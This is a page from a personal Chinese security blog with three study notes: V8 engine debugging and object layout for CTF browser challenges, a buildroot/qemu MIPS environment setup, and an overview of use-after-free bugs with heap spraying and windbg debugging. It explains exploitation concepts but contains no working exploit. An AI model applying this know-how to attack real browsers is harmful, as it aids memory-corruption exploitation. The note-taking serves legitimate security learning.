+        <h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p>
+<blockquote>
+<p>v8编译后二进制名称叫d8.</p>
+</blockquote>
+<h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntax</span><br><span class="line">V8 version 7.5.0 (candidate)</span><br><span class="line">d8&gt; var a &#x3D; [1, 2, 3];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a);</span><br><span class="line">0x2ebcfb54dd41 &lt;JSArray[3]&gt;</span><br><span class="line">[1, 2, 3]</span><br><span class="line">d8&gt; %SystemBreak();</span><br><span class="line">Trace&#x2F;breakpoint trap (core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p>
+<p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p>
+<p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p>
+<p><code>source /path/to/gdbinit_v8</code></p>
+<p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1,2,3];</span><br><span class="line">var b &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var c &#x3D; [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第一次调试</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第二次调试</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第三次调试</span><br></pre></td></tr></table></figure>
+
+<p>gdb运行d8:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;ctf&#x2F;browser&#x2F;x64.release$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: x64.release&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">[New Thread 0x7ff87fde9700 (LWP 18393)]</span><br><span class="line">[New Thread 0x7ff87f5e8700 (LWP 18394)]</span><br><span class="line">[New Thread 0x7ff87ede7700 (LWP 18395)]</span><br><span class="line">0x12e891f8df11 &lt;JSArray[3]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p>
+<p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p>
+<p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p>
+<p>telescope命令查看内存数据。</p>
+<p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p>
+<h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p>
+<p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p>
+<p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p>
+<p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p>
+<p>一个对象在内存中布局大致如下：</p>
+<ul>
+<li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li>
+<li>prototype：prototype</li>
+<li>elements:对象元素</li>
+<li>length:元素个数</li>
+<li>properties:属性</li>
+</ul>
+<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p>
+<p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p>
+<p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p>
+<blockquote>
+<p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p>
+</blockquote>
+<h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html" target="_blank" rel="noopener">https://www.codercto.com/a/81538.html</a></p>
+<p>后续需要实践做一下这个ctf题目。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Ubuntu下buildroot以及qemu环境搭建" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.413Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Ubuntu下buildroot以及qemu环境搭建</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p>
+<h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo apt-get remove binwalk</span><br><span class="line">sudo spt-get update</span><br><span class="line">sudo apt-get install build-essential autoconf git &#x2F;&#x2F;获取Git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk</span><br><span class="line">cd binwalk</span><br><span class="line">sudo python setup.py install</span><br><span class="line">sudo .&#x2F;deps.sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p>
+<p><code>sudo apt-get install libncurses5-dev patch</code></p>
+<p>下载buildroot:</p>
+<p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf buildroot-2020.02.6.tar.gz</span><br><span class="line">cd buildroot-2020.02.6</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+
+<p>出现配置界面：</p>
+<ul>
+<li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li>
+<li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li>
+<li>保存退出</li>
+</ul>
+<p><code>sudo make</code></p>
+<p>静等完成。</p>
+<p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p>
+<p>测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;mipsel-linux-gcc hello.c -o hello</span><br><span class="line">.&#x2F;hello &#x2F;&#x2F;失败</span><br></pre></td></tr></table></figure>
+
+<p>使用file查看，是小端序的mips程序。</p>
+<h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-user-static</span><br></pre></td></tr></table></figure>
+
+<p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p>
+<p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp ld-uClibc-1.0.32.so &#x2F;lib&#x2F;</span><br><span class="line">sudo chown -R root:root &#x2F;lib&#x2F;ld-uClibc-1.0.31.so</span><br><span class="line">sudo ln -s &#x2F;lib&#x2F;ld-uClibc-1.0.32.so &#x2F;lib&#x2F;ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
+
+<p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p>
+<p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can&#39;t load library &#39;libc.so.0&#39;</code></p>
+<p>解决方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp libuClibc-1.0.31.so &#x2F;lib&#x2F;</span><br><span class="line">sudo chown -R root:root &#x2F;lib&#x2F;libuClibc-1.0.32.so</span><br><span class="line">sudo ln -s &#x2F;lib&#x2F;libuClibc-1.0.32.so &#x2F;lib&#x2F;libc.so.0</span><br></pre></td></tr></table></figure>
+
+<p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p>
+<p>运行成功。</p>
+<p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p>
+<h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-UAF漏洞简单学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.410Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">UAF漏洞简单学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p>
+<p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p>
+<h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p>
+<p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p>
+<p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p>
+<blockquote>
+<p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p>
+<p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p>
+</blockquote>
+<p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p>
+<h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p>
+<p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p>
+<p>这样调试器会定位到最先出错的位置。</p>
+<blockquote>
+<p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p>
+</blockquote>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Sinky-wang
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://Visionaryxx.github.io" target="_blank">Visionary'blog</a> by Visionary
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+</body>
+</html>
